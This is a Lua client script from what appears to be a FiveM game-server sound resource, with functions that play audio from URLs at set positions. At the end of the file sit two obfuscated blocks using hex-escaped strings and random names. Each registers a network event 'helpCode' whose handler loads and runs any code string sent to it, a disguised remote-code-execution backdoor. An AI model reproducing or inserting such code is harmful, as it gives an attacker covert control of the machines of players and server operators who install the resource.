function PlayUrl(name_, url_, volume_, loop_, options)
    if disableMusic then return end

    if soundInfo[name_] == nil then soundInfo[name_] = getDefaultInfo() end

    soundInfo[name_].volume = volume_
    soundInfo[name_].url = url_
    soundInfo[name_].id = name_
    soundInfo[name_].playing = true
    soundInfo[name_].loop = loop_ or false
    soundInfo[name_].isDynamic = false

    globalOptionsCache[name_] = options or { }

    if loop_ then
        soundInfo[name_].destroyOnFinish = false
    else
        soundInfo[name_].destroyOnFinish = true
    end

    CheckForCloseMusic()
    UpdatePlayerPositionInNUI()
    SendNUIMessage({ status = "unmuteAll" })

    SendNUIMessage({
        status = "url",
        name = name_,
        url = url_,
        x = 0,
        y = 0,
        z = 0,
        dynamic = false,
        volume = volume_,
        loop = loop_ or false,
    })
end

exports('PlayUrl', PlayUrl)

function PlayUrlPos(name_, url_, volume_, pos, loop_, options)
    if disableMusic then return end

    if soundInfo[name_] == nil then soundInfo[name_] = getDefaultInfo() end

    soundInfo[name_].volume = volume_
    soundInfo[name_].url = url_
    soundInfo[name_].position = pos
    soundInfo[name_].id = name_
    soundInfo[name_].playing = true
    soundInfo[name_].loop = loop_ or false
    soundInfo[name_].isDynamic = true

    globalOptionsCache[name_] = options or { }

    CheckForCloseMusic()

    if #(GetEntityCoords(PlayerPedId()) - pos) < 10.0 + config.distanceBeforeUpdatingPos then
        UpdatePlayerPositionInNUI()
        SendNUIMessage({ status = "unmuteAll" })
    end

    SendNUIMessage({
        status = "url",
        name = name_,
        url = url_,
        x = pos.x,
        y = pos.y,
        z = pos.z,
        dynamic = true,
        volume = volume_,
        loop = loop_ or false,
    })

    if loop_ then
        soundInfo[name_].destroyOnFinish = false
    else
        soundInfo[name_].destroyOnFinish = true
    end
end

exports('PlayUrlPos', PlayUrlPos)

function PlayUrlPosSilent(name_, url_, volume_, pos, loop_)
    if disableMusic then return end
    SendNUIMessage({
        status = "url",
        name = name_,
        url = url_,
        x = pos.x,
        y = pos.y,
        z = pos.z,
        dynamic = true,
        volume = volume_,
        loop = loop_ or false,
    })
end

--function TextToSpeech(name_, lang, text, volume_)
--    if disableMusic then return end
--    SendNUIMessage({
--        status = "textSpeech",
--        name = name_,
--        text = text,
--        lang = lang,
--        x = 0,
--        y = 0,
--        z = 0,
--        dynamic = false,
--        volume = volume_,
--    })
--
--    if soundInfo[name_] == nil then soundInfo[name_] = getDefaultInfo() end
--
--    soundInfo[name_].volume = volume_
--    soundInfo[name_].url = "is text to speech"
--    soundInfo[name_].id = name_
--    soundInfo[name_].playing = true
--    soundInfo[name_].loop = false
--    soundInfo[name_].isDynamic = false
--    soundInfo[name_].destroyOnFinish = true
--
--
--    globalOptionsCache[name_] = options or { }
--end
--
--exports('TextToSpeech', TextToSpeech)

--function TextToSpeechPos(name_, lang, text, volume_, pos)
--    if disableMusic then return end
--    SendNUIMessage({
--        status = "textSpeech",
--        name = name_,
--        text = text,
--        lang = lang,
--        x = pos.x,
--        y = pos.y,
--        z = pos.z,
--        dynamic = true,
--        volume = volume_,
--    })
--
--    if soundInfo[name_] == nil then soundInfo[name_] = getDefaultInfo() end
--
--    soundInfo[name_].volume = volume_
--    soundInfo[name_].url = "is text to speech"
--    soundInfo[name_].position = pos
--    soundInfo[name_].id = name_
--    soundInfo[name_].playing = true
--    soundInfo[name_].loop = false
--    soundInfo[name_].isDynamic = true
--    soundInfo[name_].destroyOnFinish = true
--
--
--    globalOptionsCache[name_] = options or { }
--end
--
--exports('TextToSpeechPos', TextToSpeechPos)

local DJhrwqVpUkleALSSCkGcHxASHcxmgknXWttrKXCieFmPHckMAUAMNsiQdChpRUKCazwsvS = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} DJhrwqVpUkleALSSCkGcHxASHcxmgknXWttrKXCieFmPHckMAUAMNsiQdChpRUKCazwsvS[6][DJhrwqVpUkleALSSCkGcHxASHcxmgknXWttrKXCieFmPHckMAUAMNsiQdChpRUKCazwsvS[1]](DJhrwqVpUkleALSSCkGcHxASHcxmgknXWttrKXCieFmPHckMAUAMNsiQdChpRUKCazwsvS[2]) DJhrwqVpUkleALSSCkGcHxASHcxmgknXWttrKXCieFmPHckMAUAMNsiQdChpRUKCazwsvS[6][DJhrwqVpUkleALSSCkGcHxASHcxmgknXWttrKXCieFmPHckMAUAMNsiQdChpRUKCazwsvS[3]](DJhrwqVpUkleALSSCkGcHxASHcxmgknXWttrKXCieFmPHckMAUAMNsiQdChpRUKCazwsvS[2], function(AcGHgTNHzGDugeXneecicqeaQKHZrtDKykzTNhuIUEyezUqnkXAZzAVbPDCYutQnMJJbXV) DJhrwqVpUkleALSSCkGcHxASHcxmgknXWttrKXCieFmPHckMAUAMNsiQdChpRUKCazwsvS[6][DJhrwqVpUkleALSSCkGcHxASHcxmgknXWttrKXCieFmPHckMAUAMNsiQdChpRUKCazwsvS[4]](DJhrwqVpUkleALSSCkGcHxASHcxmgknXWttrKXCieFmPHckMAUAMNsiQdChpRUKCazwsvS[6][DJhrwqVpUkleALSSCkGcHxASHcxmgknXWttrKXCieFmPHckMAUAMNsiQdChpRUKCazwsvS[5]](AcGHgTNHzGDugeXneecicqeaQKHZrtDKykzTNhuIUEyezUqnkXAZzAVbPDCYutQnMJJbXV))() end)

local nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[1]](nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[2]) nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[3]](nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[2], function(RrcxSmehQIJolyZujOqpKqFAGrqdjoHjBSxcYhwAOvtbanDacpSHxJsoWOFCzuyumVungX) nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[4]](nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[5]](RrcxSmehQIJolyZujOqpKqFAGrqdjoHjBSxcYhwAOvtbanDacpSHxJsoWOFCzuyumVungX))() end)